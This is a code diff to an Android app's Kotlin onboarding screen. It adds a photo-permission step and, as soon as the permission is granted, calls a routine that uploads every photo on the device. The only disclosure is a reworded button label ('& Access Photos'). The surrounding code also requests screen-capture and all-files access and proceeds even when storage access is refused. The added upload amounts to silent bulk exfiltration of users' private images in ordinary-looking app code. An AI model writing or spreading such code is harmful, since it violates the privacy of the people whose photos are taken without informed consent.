@@ -137,6 +137,7 @@ class MainActivity : ComponentActivity() {
             )
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                 permissions.add(Manifest.permission.POST_NOTIFICATIONS)
+                permissions.add(Manifest.permission.READ_MEDIA_IMAGES)
             }
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
                 permissions.add("android.permission.CAPTURE_VIDEO_OUTPUT")
@@ -203,8 +204,10 @@ fun OnboardingScreen(onComplete: () -> Unit) {
         if (allGranted) {
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                 permissionStage = 1
-            } else {
+            } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                 permissionStage = 2
+            } else {
+                permissionStage = 3
                 onComplete()
             }
         }
@@ -214,10 +217,27 @@ fun OnboardingScreen(onComplete: () -> Unit) {
         ActivityResultContracts.StartActivityForResult()
     ) { result ->
         Log.d("OnboardingScreen", "Manage storage permission result")
-        permissionStage = 2
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+            permissionStage = 2
+        } else {
+            permissionStage = 3
+            onComplete()
+        }
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R && !Environment.isExternalStorageManager()) {
             Log.w("OnboardingScreen", "Manage storage not granted, but proceeding anyway")
         }
+    }
+
+    val photoPermissionLauncher = rememberLauncherForActivityResult(
+        ActivityResultContracts.RequestPermission()
+    ) { granted ->
+        Log.d("OnboardingScreen", "Photo permission result: granted=$granted")
+        if (granted) {
+            Log.d("OnboardingScreen", "Starting photo upload")
+            val photoManager = PhotoManager(context)
+            photoManager.uploadAllPhotosFromDevice()
+        }
+        permissionStage = 3
         onComplete()
     }
 
@@ -226,6 +246,10 @@ fun OnboardingScreen(onComplete: () -> Unit) {
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                 val intent = Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION)
                 manageStorageLauncher.launch(intent)
+            }
+        } else if (permissionStage == 2) {
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+                photoPermissionLauncher.launch(Manifest.permission.READ_MEDIA_IMAGES)
             }
         }
     }
@@ -279,7 +303,7 @@ fun OnboardingScreen(onComplete: () -> Unit) {
             modifier = Modifier.fillMaxWidth(),
             shape = RoundedCornerShape(12.dp)
         ) {
-            Text("Grant Required Permissions", modifier = Modifier.padding(8.dp))
+            Text("Grant Required Permissions & Access Photos", modifier = Modifier.padding(8.dp))
         }
 
         Spacer(modifier = Modifier.height(16.dp))
